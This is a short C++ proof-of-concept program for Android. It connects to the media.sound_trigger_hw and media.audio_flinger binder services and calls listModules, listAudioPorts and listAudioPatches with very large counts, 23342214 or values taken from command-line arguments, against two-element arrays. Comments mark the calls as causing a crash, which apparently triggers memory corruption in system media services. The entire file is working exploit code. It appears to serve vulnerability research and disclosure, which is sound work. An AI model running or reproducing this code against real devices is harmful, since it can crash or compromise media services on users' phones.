#include <binder/Parcel.h>

#include <binder/ProcessState.h>

#include <binder/IServiceManager.h>

#include <soundtrigger/ISoundTriggerHwService.h>

#include <binder/TextOutput.h>

#include <media/IAudioFlinger.h>

#include <system/sound_trigger.h>

#include <sys/stat.h>

#include <fcntl.h>





using namespace android;

int main(__attribute__((unused)) int argc, __attribute__((unused)) char*
const argv[])

{

   sp<IServiceManager> sm = defaultServiceManager();

   sp<IBinder> service = sm->checkService(String16("media.sound_trigger_hw"));


   sp<ISoundTriggerHwService> iSoundTrigger =
ISoundTriggerHwService::asInterface(service);

   struct sound_trigger_module_descriptor st_dec;
   struct sound_trigger_module_descriptor st_dec_array[2];

   uint32_t numModules = 23342214;
   iSoundTrigger->listModules(st_dec_array, &numModules);
   printf("sound_trigger_module_descriptor size is %d\n", sizeof(struct sound_trigger_module_descriptor)); // 184
   
   
   sp<IBinder> audio_flinger_service = sm->checkService(String16("media.audio_flinger"));
   sp<IAudioFlinger> iAudioFlinger =
IAudioFlinger::asInterface(audio_flinger_service);
   struct audio_port ports[2];
   unsigned int num_ports = atoi(argv[1]); // 4364806 in my device
   unsigned int num_patches = atoi(argv[2]); // 631986 in my device
   struct audio_patch patches[2]; 
   iAudioFlinger->listAudioPorts(&num_ports, ports); // crash
   iAudioFlinger->listAudioPatches(&num_patches, patches); // crash
   printf("after binder call struct audio_port size is %d, struct audio_patch is %d\n", sizeof(struct audio_port), sizeof(struct audio_patch));  // 984 6796   (4364805, 631985)
   return 0;

}
